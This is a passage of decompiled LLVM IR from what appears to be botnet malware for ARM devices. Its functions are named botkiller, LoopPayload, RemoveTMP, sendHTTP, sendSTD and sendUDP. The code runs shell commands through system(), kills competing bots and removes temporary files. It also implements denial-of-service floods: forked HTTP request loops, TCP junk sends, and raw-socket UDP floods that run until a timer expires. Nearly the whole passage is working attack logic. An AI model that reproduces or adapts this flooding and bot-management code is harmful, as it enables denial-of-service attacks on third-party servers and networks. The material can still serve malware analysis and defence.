  %v3_f858 = call i32 @socket(i32 2, i32 2, i32 0)
  %v0_f864 = call i32 @NetisRanges()
  store i32 2, i32* %stack_var_-52, align 4
  %v1_f880 = call i32 @__GI_htons(i32 add (i32 ptrtoint (i32* @global_var_d100.543 to i32), i32 -91))
  %v4_f8a8 = call i32 @__GI_memset(i8* %v3_f8a8, i32 0, i32 8)
  store i32 %v2_f8bc, i32* @r0, align 4
  %v3_f8cc = call i32 @sprintf(i32 %v2_f8bc, i32 ptrtoint ([711 x i8]* @global_var_24734.545 to i32))
  %v3_f8e0 = call i32 @strlen(i8* %tmp17)
  %v6_f914 = call i32 @__libc_sendto(i32 %v3_f858, i32 %v2_f8bc, i32 %v3_f8e0, i32 0, i32 %v2_f8e8, i32 16)
  br label %dec_label_pc_f84c

; uselistorder directives
  uselistorder i32 %v2_f8bc, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @LoopPayload(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f94c = call i32 @__libc_system(i32 ptrtoint ([704 x i8]* @global_var_24a04.549 to i32))
  ret i32 %v2_f94c
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2188 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-2316 = alloca i32, align 4
  %stack_var_-2028 = alloca i32, align 4
  %stack_var_-1064 = alloca i32, align 4
  %stack_var_-44 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_f970 = load i32, i32* @r4, align 4
  %v6_f970 = load i32, i32* @fp, align 4
  %v13_f970 = load i32, i32* @lr, align 4
  store i32 63864, i32* %stack_var_-4, align 4
  %v2_f974 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f974, i32* @fp, align 4
  %v21_f998 = ptrtoint i8** %stack_var_-44 to i32
  store i32 %v21_f998, i32* @lr, align 4
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_26670.559, i32 0, i32 0), i8** %stack_var_-44, align 4
  store i32 ptrtoint ([247 x i8*]* @global_var_26244.811 to i32), i32* @r3, align 4
  %v2_f9ac = ptrtoint i32* %stack_var_-1064 to i32
  store i32 988, i32* @ip, align 4
  store i32 %v2_f9ac, i32* @r0, align 4
  store i32 ptrtoint ([247 x i8*]* @global_var_26244.811 to i32), i32* @r1, align 4
  store i32 988, i32* @r2, align 4
  %v0_f9c0 = call i32 @memcpy()
  %v2_f9d0 = ptrtoint i32* %stack_var_-2028 to i32
  store i32 %v2_f9d0, i32* @r3, align 4
  store i32 964, i32* @ip, align 4
  store i32 %v2_f9d0, i32* @r0, align 4
  store i32 ptrtoint ([241 x i8*]* @global_var_25620.1039 to i32), i32* @r1, align 4
  store i32 964, i32* @r2, align 4
  %v0_f9e4 = call i32 @memcpy()
  %v6_f9fc = icmp sgt i32 %tmp12, 0
  br i1 %v6_f9fc, label %dec_label_pc_fa00, label %dec_label_pc_fbcc

dec_label_pc_fa00:                                ; preds = %entry
  %v2_fa08 = ptrtoint i32* %stack_var_-2316 to i32
  %v3_fa18 = bitcast i32* %stack_var_-2316 to i8*
  %v4_fa18 = call i32 @__GI_memset(i8* %v3_fa18, i32 0, i32 128)
  %v2_fa34 = ptrtoint i32* %stack_var_-24 to i32
  %v2_fa3c = add i32 %v2_fa34, -52
  %v1_fa40 = inttoptr i32 %v2_fa3c to i32*
  %v2_fa40 = load i32, i32* %v1_fa40, align 4
  store i32 %v2_fa40, i32* @lr, align 4
  store i32 %v2_fa34, i32* @r4, align 4
  store i32 %v2_fa08, i32* @r0, align 4
  store i32 127, i32* @r1, align 4
  %v7_fae4 = call i32 @__GI_snprintf(i32 %v2_fa08, i32 127, i32 ptrtoint ([100 x i8]* @global_var_266a0.1041 to i32), i32 %v2_fa40, i32 %v2_fa40, i32 %v2_fa40)
  %v1_fb78 = call i32 @__libc_system(i32 %v2_fa08)
  store i32 %v2_fa34, i32* @lr, align 4
  %v2_fba4 = ptrtoint i32* %stack_var_-2188 to i32
  store i32 %v2_fba4, i32* @r0, align 4
  %v3_fbb0 = call i32 @sprintf(i32 %v2_fba4, i32 ptrtoint ([14 x i8]* @global_var_26724.1045 to i32))
  %v1_fbc4 = call i32 @__libc_system(i32 %v2_fba4)
  br label %dec_label_pc_fbd4

dec_label_pc_fbcc:                                ; preds = %entry
  %v1_fbd0 = call i32 @sleep(i32 5)
  br label %dec_label_pc_fbd4

dec_label_pc_fbd4:                                ; preds = %dec_label_pc_fa00, %dec_label_pc_fbcc
  %storemerge10 = phi i32 [ %v1_fbd0, %dec_label_pc_fbcc ], [ %v1_fbc4, %dec_label_pc_fa00 ]
  store i32 %v3_f970, i32* @r4, align 4
  store i32 %v6_f970, i32* @fp, align 4
  store i32 %v13_f970, i32* @lr, align 4
  ret i32 %storemerge10

; uselistorder directives
  uselistorder i32 %v2_fba4, { 0, 2, 1 }
  uselistorder i32 %v2_fa40, { 1, 2, 3, 0 }
  uselistorder i32 %v2_fa34, { 1, 2, 0 }
  uselistorder i32 %v2_fa08, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-44, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 51, { 0, 1, 2, 8, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_fbd4, { 1, 0 }
}

define i32 @RemoveTMP(i32 %arg1) local_unnamed_addr {
entry:
  %v2_fc08 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_26734.1048 to i32))
  %v2_fc10 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_26760.1050 to i32))
  %v2_fc18 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_26778.1052 to i32))
  %v2_fc20 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_26760.1050 to i32))
  %v2_fc28 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_26790.1054 to i32))
  %v2_fc30 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_267a0.1056 to i32))
  %v2_fc38 = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_267ac.1058 to i32))
  %v2_fc40 = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_267c4.1060 to i32))
  %v2_fc48 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_267d8.1062 to i32))
  %v2_fc50 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_267e4.1064 to i32))
  %v2_fc58 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_267f8.1066 to i32))
  %v2_fc60 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_26808.1068 to i32))
  %v2_fc68 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_26820.1070 to i32))
  ret i32 %v2_fc68

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_fcac = load i32, i32* @fp, align 4
  store i32 64692, i32* %stack_var_-4, align 4
  %v2_fcb0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fcb0, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_fcd0 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_fce0 = icmp eq i32 %v1_fcd0, 0
  br i1 %v2_fce0, label %dec_label_pc_fce8, label %dec_label_pc_fcf4

dec_label_pc_fce8:                                ; preds = %entry
  br label %dec_label_pc_fdc0

dec_label_pc_fcf4:                                ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_fcf8 = add i32 %v1_fcd0, 16
  %v2_fcf8 = inttoptr i32 %v1_fcf8 to i32*
  %v3_fcf8 = load i32, i32* %v2_fcf8, align 4
  %v1_fcfc = inttoptr i32 %v3_fcf8 to i32*
  %v2_fcfc = load i32, i32* %v1_fcfc, align 4
  %v1_fd04 = add i32 %v1_fcd0, 12
  %v2_fd04 = inttoptr i32 %v1_fd04 to i32*
  %v3_fd04 = load i32, i32* %v2_fd04, align 4
  store i32 %v3_fd04, i32* @r2, align 4
  %v2_fd10 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fd10, i32* @r3, align 4
  %v5_fd1c = call i32 @bcopy(i32 %v2_fcfc, i32 %v2_fd10, i32 %v3_fd04, i32 %v2_fd10, i32 %v1_fcd0)
  %v2_fd28 = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_fd48 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_fd54 = ptrtoint i32* %stack_var_-44 to i32
  %v5_fd70 = call i32 @__GI_setsockopt(i32 %v3_fd48, i32 6, i32 1, i32 %v2_fd54, i32 4)
  %v3_fd78 = icmp eq i32 %v3_fd48, -1
  br i1 %v3_fd78, label %dec_label_pc_fd80, label %dec_label_pc_fd8c

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fcf4
  br label %dec_label_pc_fdc0

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fcf4
  %v2_fd0c = ptrtoint i32* %stack_var_-40 to i32
  %v3_fd9c = call i32 @__libc_connect(i32 %v3_fd48, i32 %v2_fd0c, i32 16)
  %v3_fda4 = icmp eq i32 %v3_fd9c, -1
  br i1 %v3_fda4, label %dec_label_pc_fdac, label %dec_label_pc_fdb8

dec_label_pc_fdac:                                ; preds = %dec_label_pc_fd8c
  br label %dec_label_pc_fdc0

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fd8c
  br label %dec_label_pc_fdc0

dec_label_pc_fdc0:                                ; preds = %dec_label_pc_fdac, %dec_label_pc_fd80, %dec_label_pc_fce8, %dec_label_pc_fdb8
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_fce8 ], [ 0, %dec_label_pc_fd80 ], [ 0, %dec_label_pc_fdac ], [ %v3_fd48, %dec_label_pc_fdb8 ]
  store i32 %v3_fcac, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_fdc0, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-808 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 64992, i32* %stack_var_-4, align 4
  %v2_fddc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fddc, i32* @fp, align 4
  %v2_fdf8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 ptrtoint ([62 x i8*]* @global_var_27bcc.1134 to i32), i32* @r3, align 4
  %v2_fe04 = ptrtoint i32* %stack_var_-284 to i32
  store i32 248, i32* @ip, align 4
  store i32 %v2_fe04, i32* @r0, align 4
  store i32 ptrtoint ([62 x i8*]* @global_var_27bcc.1134 to i32), i32* @r1, align 4
  store i32 248, i32* @r2, align 4
  %v0_fe18 = call i32 @memcpy()
  %v2_fe30 = call i32 @__GI_time(i32* null)
  %v3_fe38 = load i32, i32* %stack_var_0, align 4
  %v2_fe3c = add i32 %v3_fe38, %v2_fe30
  %v0_fe44 = call i32 @rand()
  %v2_fe58 = srem i32 %v0_fe44, 3
  %v3_fe84 = mul nsw i32 %v2_fe58, 4
  %v2_fe8c = add i32 %v3_fe84, %v2_fdf8
  %v2_fe90 = add i32 %v2_fe8c, -272
  %v1_fe94 = inttoptr i32 %v2_fe90 to i32*
  %v2_fe94 = load i32, i32* %v1_fe94, align 4
  store i32 %v2_fe94, i32* @r4, align 4
  %v0_fe98 = call i32 @rand()
  %v2_fef8 = ptrtoint i32* %stack_var_-808 to i32
  store i32 %v2_fef8, i32* @r0, align 4
  %v3_ff14 = call i32 @sprintf(i32 %v2_fef8, i32 ptrtoint ([62 x i8]* @global_var_27cc4.1144 to i32))
  %tmp30 = bitcast i32* %stack_var_-808 to i8*
  %v5_ffcc37 = icmp sgt i32 %arg6, 0
  br i1 %v5_ffcc37, label %dec_label_pc_ff24, label %dec_label_pc_ffd0

dec_label_pc_ff24:                                ; preds = %entry, %dec_label_pc_ffb4
  %storemerge138 = phi i32 [ %v1_ffb8, %dec_label_pc_ffb4 ], [ 0, %entry ]
  %v0_ff24 = call i32 @__libc_fork()
  %v2_ff2c = icmp eq i32 %v0_ff24, 0
  br i1 %v2_ff2c, label %dec_label_pc_ffb4, label %dec_label_pc_ff94

dec_label_pc_ff38:                                ; preds = %dec_label_pc_ff94
  %v4_ff54 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v2_ff64 = icmp eq i32 %v4_ff54, 0
  br i1 %v2_ff64, label %dec_label_pc_ff94, label %dec_label_pc_ff6c

dec_label_pc_ff6c:                                ; preds = %dec_label_pc_ff38
  %v3_ff74 = call i32 @strlen(i8* %tmp30)
  store i32 %v3_ff74, i32* @r2, align 4
  store i32 %v2_fef8, i32* @r3, align 4
  %v2_ff88 = call i32 @__GI___libc_write(i32 %v4_ff54, i32 %v2_fef8)
  %v1_ff90 = call i32 @__GI___libc_close(i32 %v4_ff54)
  br label %dec_label_pc_ff94

dec_label_pc_ff94:                                ; preds = %dec_label_pc_ff38, %dec_label_pc_ff6c, %dec_label_pc_ff24
  %v2_ff98 = call i32 @__GI_time(i32* null)
  %v5_ffa8 = icmp slt i32 %v2_ff98, %v2_fe3c
  br i1 %v5_ffa8, label %dec_label_pc_ff38, label %dec_label_pc_ffac

dec_label_pc_ffac:                                ; preds = %dec_label_pc_ff94
  %v1_ffb0 = call i32 @__GI__exit(i32 1)
  br label %dec_label_pc_ffb4

dec_label_pc_ffb4:                                ; preds = %dec_label_pc_ff24, %dec_label_pc_ffac
  %v1_ffd83 = phi i32 [ 0, %dec_label_pc_ff24 ], [ %v1_ffb0, %dec_label_pc_ffac ]
  %v1_ffb8 = add nuw nsw i32 %storemerge138, 1
  %v5_ffcc = icmp slt i32 %v1_ffb8, %arg6
  br i1 %v5_ffcc, label %dec_label_pc_ff24, label %dec_label_pc_ffd0

dec_label_pc_ffd0:                                ; preds = %dec_label_pc_ffb4, %entry
  %v1_ffd8.lcssa = phi i32 [ %v3_ff14, %entry ], [ %v1_ffd83, %dec_label_pc_ffb4 ]
  ret i32 %v1_ffd8.lcssa

; uselistorder directives
  uselistorder i32 %v1_ffb8, { 1, 0 }
  uselistorder i32 %v4_ff54, { 1, 0, 2 }
  uselistorder i32 %v2_fef8, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_ffb4, { 1, 0 }
  uselistorder label %dec_label_pc_ff94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ff24, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fff0 = load i32, i32* @fp, align 4
  store i32 %v3_fff0, i32* %stack_var_-16, align 4
  store i32 65528, i32* %stack_var_-4, align 4
  %v13_fff0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_fff4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fff4, i32* @fp, align 4
  %v3_10014 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_10024 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_10038 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10044 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10044, i32* @r0, align 4
  %v2_10050 = call i32 @bzero(i32 %v2_10044, i32 16)
  %v1_10058 = add i32 %v1_10038, 16
  %v2_10058 = inttoptr i32 %v1_10058 to i32*
  %v3_10058 = load i32, i32* %v2_10058, align 4
  %v1_1005c = inttoptr i32 %v3_10058 to i32*
  %v2_1005c = load i32, i32* %v1_1005c, align 4
  %v1_10064 = add i32 %v1_10038, 12
  %v2_10064 = inttoptr i32 %v1_10064 to i32*
  %v3_10064 = load i32, i32* %v2_10064, align 4
  store i32 %v3_10064, i32* @r2, align 4
  %v2_10070 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10070, i32* @r3, align 4
  %v5_1007c = call i32 @bcopy(i32 %v2_1005c, i32 %v2_10070, i32 %v3_10064, i32 %v2_10070, i32 ptrtoint (i32* @0 to i32))
  %v1_10084 = add i32 %v1_10038, 8
  %v2_10084 = inttoptr i32 %v1_10084 to i32*
  %v3_10084 = load i32, i32* %v2_10084, align 4
  %v3_1008c = urem i32 %v3_10084, 65536
  store i32 %v3_1008c, i32* %stack_var_-52, align 4
  %v2_100b0 = ptrtoint i32* %stack_var_-196 to i32
  %v2_10164 = add i32 %v2_10024, %arg3
  %v2_1010c = add i32 %v13_fff0, -180
  br label %dec_label_pc_100ac

dec_label_pc_100ac:                               ; preds = %dec_label_pc_10188, %entry
  %storemerge7 = phi i32 [ 0, %entry ], [ %v1_1018c, %dec_label_pc_10188 ]
  store i32 ptrtoint ([36 x i8*]* @global_var_27ec0.1182 to i32), i32* @r3, align 4
  store i32 144, i32* @ip, align 4
  store i32 %v2_100b0, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_27ec0.1182 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_100c4 = call i32 @memcpy()
  %v0_100c8 = call i32 @rand()
  %v1_100d8 = zext i32 %v0_100c8 to i64
  %v4_100d8 = mul nuw nsw i64 %v1_100d8, 954437177
  %v3_100dc1 = udiv i64 %v4_100d8, 34359738368
  %tmp = icmp ult i32 %storemerge7, 50
  br i1 %tmp, label %dec_label_pc_10188, label %dec_label_pc_10128

dec_label_pc_10128:                               ; preds = %dec_label_pc_100ac
  %v3_100e83 = mul nuw nsw i64 %v3_100dc1, 4
  %v3_100e8 = trunc i64 %v3_100e83 to i32
  %v2_100f0.neg = sub i32 %v0_100c8, %v3_100e8
  %v3_100ec5 = mul nuw nsw i64 %v3_100dc1, 32
  %v3_100ec = trunc i64 %v3_100ec5 to i32
  %v2_100f4 = sub i32 %v2_100f0.neg, %v3_100ec
  %v3_10104 = mul i32 %v2_100f4, 4
  %v2_10110 = add i32 %v2_1010c, %v3_10104
  %v1_10114 = inttoptr i32 %v2_10110 to i32*
  %v2_10114 = load i32, i32* %v1_10114, align 4
  %v5_10138 = call i32 @__libc_send(i32 %v3_10014, i32 %v2_10114, i32 75, i32 0)
  %v3_1014c = call i32 @__libc_connect(i32 %v3_10014, i32 %v2_10044, i32 16)
  %v2_10154 = call i32 @__GI_time(i32* null)
  store i32 %v2_10154, i32* @r1, align 4
  %v5_1016c = icmp slt i32 %v2_10154, %v2_10164
  br i1 %v5_1016c, label %dec_label_pc_10180, label %dec_label_pc_10170

dec_label_pc_10170:                               ; preds = %dec_label_pc_10128
  %v1_10174 = call i32 @__GI___libc_close(i32 %v3_10014)
  %v1_1017c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10180

dec_label_pc_10180:                               ; preds = %dec_label_pc_10128, %dec_label_pc_10170
  br label %dec_label_pc_10188

dec_label_pc_10188:                               ; preds = %dec_label_pc_100ac, %dec_label_pc_10180
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_100ac ], [ 0, %dec_label_pc_10180 ]
  %v1_1018c = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_100ac

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_10044, { 0, 2, 1 }
  uselistorder i32 %v1_10038, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 50, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10188, { 1, 0 }
  uselistorder label %dec_label_pc_10180, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 65964, i32* %stack_var_-4, align 4
  %v2_101a8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_101a8, i32* @fp, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v2_101cc = icmp eq i32 %arg2, 0
  br i1 %v2_101cc, label %dec_label_pc_101d4, label %dec_label_pc_101ec

dec_label_pc_101d4:                               ; preds = %entry
  %v0_101d4 = call i32 @rand_cmwc()
  br label %dec_label_pc_10208

dec_label_pc_101ec:                               ; preds = %entry
  %v3_101f4 = urem i32 %arg2, 65536
  %v1_101fc = call i32 @__GI_htons(i32 %v3_101f4)
  br label %dec_label_pc_10208

dec_label_pc_10208:                               ; preds = %dec_label_pc_101d4, %dec_label_pc_101ec
  %v3_10218 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_10220 = icmp eq i32 %v3_10218, 0
  br i1 %v2_10220, label %dec_label_pc_10228, label %dec_label_pc_10768

dec_label_pc_10228:                               ; preds = %dec_label_pc_10208
  store i32 8, i32* %r2.global-to-local, align 4
  %v3_1023c = bitcast i32* %stack_var_-72 to i8*
  %v4_1023c = call i32 @__GI_memset(i8* %v3_1023c, i32 0, i32 8)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_1024c = icmp eq i32 %arg4, 32
  br i1 %v7_1024c, label %dec_label_pc_10254, label %dec_label_pc_10384

dec_label_pc_10254:                               ; preds = %dec_label_pc_10228
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_10260 = call i32 @socket(i32 2, i32 2, i32 17)
  %v2_10270 = icmp eq i32 %v3_10260, 0
  br i1 %v2_10270, label %dec_label_pc_10278, label %dec_label_pc_10290

dec_label_pc_10278:                               ; preds = %dec_label_pc_10254
  %v2_1027c = load i32, i32* @global_var_324c8.59, align 4
  %v3_10288 = call i32 @HackerPrint(i32 %v2_1027c, i32 ptrtoint ([27 x i8]* @global_var_27f50.1186 to i32))
  br label %dec_label_pc_10768

dec_label_pc_10290:                               ; preds = %dec_label_pc_10254
  %v3_10290 = load i32, i32* %stack_var_0, align 4
  %v1_10294 = add i32 %v3_10290, 1
  %v1_1029c = call i32 @malloc(i32 %v1_10294)
  %v2_102ac = icmp eq i32 %v1_1029c, 0
  br i1 %v2_102ac, label %dec_label_pc_10768, label %dec_label_pc_102b4

dec_label_pc_102b4:                               ; preds = %dec_label_pc_10290
  %v3_102b4 = load i32, i32* %stack_var_0, align 4
  %v1_102b8 = add i32 %v3_102b4, 1
  store i32 %v1_102b8, i32* %r2.global-to-local, align 4
  %v3_102c8 = inttoptr i32 %v1_1029c to i8*
  %v4_102c8 = call i32 @__GI_memset(i8* %v3_102c8, i32 0, i32 %v1_102b8)
  %v2_102d4 = call i32 @makeRandomStr(i32 %v1_1029c, i32 %v3_102b4)
  %v2_102dc = call i32 @__GI_time(i32* null)
  store i32 %v2_102dc, i32* %r2.global-to-local, align 4
  %v2_102e8 = add i32 %v2_102dc, %arg3
  %v2_102fc = ptrtoint i32* %stack_var_-80 to i32
  br label %dec_label_pc_102f8

dec_label_pc_102f8:                               ; preds = %dec_label_pc_10374, %dec_label_pc_10368, %dec_label_pc_102b4
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_102b4 ], [ 0, %dec_label_pc_10368 ], [ %v1_10378, %dec_label_pc_10374 ]
  %v3_102f8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_102f8, i32* %r2.global-to-local, align 4
  %v6_1031c = call i32 @__libc_sendto(i32 %v3_10260, i32 %v1_1029c, i32 %v3_102f8, i32 0, i32 %v2_102fc, i32 16)
  store i32 %stack_var_-112.0, i32* %r2.global-to-local, align 4
  %v9_10328 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_10328, label %dec_label_pc_10330, label %dec_label_pc_10374

dec_label_pc_10330:                               ; preds = %dec_label_pc_102f8
  br i1 %v2_101cc, label %dec_label_pc_1033c, label %dec_label_pc_10350

dec_label_pc_1033c:                               ; preds = %dec_label_pc_10330
  %v0_1033c = call i32 @rand_cmwc()
  br label %dec_label_pc_10350

dec_label_pc_10350:                               ; preds = %dec_label_pc_10330, %dec_label_pc_1033c
  %v2_10354 = call i32 @__GI_time(i32* null)
  store i32 %v2_10354, i32* %r2.global-to-local, align 4
  %v8_10364 = icmp sgt i32 %v2_10354, %v2_102e8
  br i1 %v8_10364, label %dec_label_pc_10768, label %dec_label_pc_10368

dec_label_pc_10368:                               ; preds = %dec_label_pc_10350
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_102f8

dec_label_pc_10374:                               ; preds = %dec_label_pc_102f8
  %v1_10378 = add i32 %stack_var_-112.0, 1
  br label %dec_label_pc_102f8

dec_label_pc_10384:                               ; preds = %dec_label_pc_10228
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_10398 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_103a8 = icmp eq i32 %v3_10398, 0
  br i1 %v2_103a8, label %dec_label_pc_103b0, label %dec_label_pc_103c8

dec_label_pc_103b0:                               ; preds = %dec_label_pc_10384
  %v2_103b4 = load i32, i32* @global_var_324c8.59, align 4
  %v3_103c0 = call i32 @HackerPrint(i32 %v2_103b4, i32 ptrtoint ([27 x i8]* @global_var_27f50.1186 to i32))
  br label %dec_label_pc_10764

dec_label_pc_103c8:                               ; preds = %dec_label_pc_10384
  store i32 1, i32* %stack_var_-84, align 4
  %v2_103d0 = ptrtoint i32* %stack_var_-84 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_103ec = call i32 @__GI_setsockopt(i32 %v3_10398, i32 0, i32 3, i32 %v2_103d0, i32 4)
  %v1_103f4 = icmp slt i32 %v5_103ec, 0
  br i1 %v1_103f4, label %dec_label_pc_103fc, label %dec_label_pc_10414

dec_label_pc_103fc:                               ; preds = %dec_label_pc_103c8
  %v2_10400 = load i32, i32* @global_var_324c8.59, align 4
  %v3_1040c = call i32 @HackerPrint(i32 %v2_10400, i32 ptrtoint ([33 x i8]* @global_var_27f6c.1188 to i32))
  br label %dec_label_pc_10764

dec_label_pc_10414:                               ; preds = %dec_label_pc_103c8
  br label %dec_label_pc_10420

dec_label_pc_10420:                               ; preds = %dec_label_pc_10414, %dec_label_pc_10420
  %v1_1045821 = phi i32 [ 49, %dec_label_pc_10414 ], [ %v1_10458, %dec_label_pc_10420 ]
  %v2_10424 = call i32 @__GI_time(i32* null)
  store i32 %v2_10424, i32* @r4, align 4
  %v0_10430 = call i32 @rand_cmwc()
  %v0_10438 = load i32, i32* @r4, align 4
  %v2_10438 = xor i32 %v0_10438, %v0_10430
  %v1_10440 = call i32 @srand(i32 %v2_10438)
  %v0_10444 = call i32 @rand()
  %v1_10450 = call i32 @init_rand(i32 %v0_10444)
  %v1_10458 = add nsw i32 %v1_1045821, -1
  %v3_10464 = icmp eq i32 %v1_1045821, 0
  br i1 %v3_10464, label %dec_label_pc_1046c, label %dec_label_pc_10420

dec_label_pc_1046c:                               ; preds = %dec_label_pc_10420
  %v2_10470 = icmp eq i32 %arg4, 0
  br i1 %v2_10470, label %dec_label_pc_1049c, label %dec_label_pc_10484

dec_label_pc_10484:                               ; preds = %dec_label_pc_1046c
  %v1_10488 = sub i32 32, %arg4
  store i32 %v1_10488, i32* %r2.global-to-local, align 4
  %v1_10494 = shl i32 -1, %v1_10488
  br label %dec_label_pc_1049c

dec_label_pc_1049c:                               ; preds = %dec_label_pc_1046c, %dec_label_pc_10484
  %storemerge10 = phi i32 [ %v1_10494, %dec_label_pc_10484 ], [ 0, %dec_label_pc_1046c ]
  %v3_1049c = load i32, i32* %stack_var_0, align 4
  %v1_104a0 = add i32 %v3_1049c, 28
  %v1_104b0 = add i32 %v3_1049c, 42
  %v3_104b4 = and i32 %v1_104b0, -8
  %v1_104bc = load i32, i32* @sp, align 4
  %v2_104bc = sub i32 %v1_104bc, %v3_104b4
  %v1_104c0 = add i32 %v2_104bc, 8
  store i32 %v1_104c0, i32* %r2.global-to-local, align 4
  %v1_104cc = add i32 %v2_104bc, 15
  %v3_104d0 = and i32 %v1_104cc, -8
  %v1_104f0 = add i32 %v3_104d0, 20
  %v5_104f4 = inttoptr i32 %v1_104f0 to i16*
  %v3_104f8 = load i32, i32* %stack_var_-76, align 4
